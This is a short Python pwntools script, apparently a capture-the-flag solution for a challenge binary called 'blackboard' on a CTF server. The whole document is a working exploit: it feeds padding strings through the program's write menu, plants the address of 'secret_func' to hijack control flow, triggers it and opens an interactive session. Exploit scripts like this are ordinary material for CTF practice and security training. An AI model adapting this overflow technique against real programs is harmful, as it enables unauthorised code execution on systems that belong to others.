from pwn import *

context(os='linux', arch='i386')
context.log_level = 'debug'

host = "ctf2.cpaw.site"
port = 9999 

if len(sys.argv) > 1 and sys.argv[1] == '-r':
    p = remote(host, port)
else:
    p = process('./blackboard')

# main

e = ELF('./blackboard')

def write(text):
    p.sendline("1")
    p.sendline(text)

write("A"*12)
write("B"*12)
write("C"*12)
write("D"*12)
write("E"*2)
write(p32(e.functions['secret_func'].address))

p.sendline("2")

p.interactive()
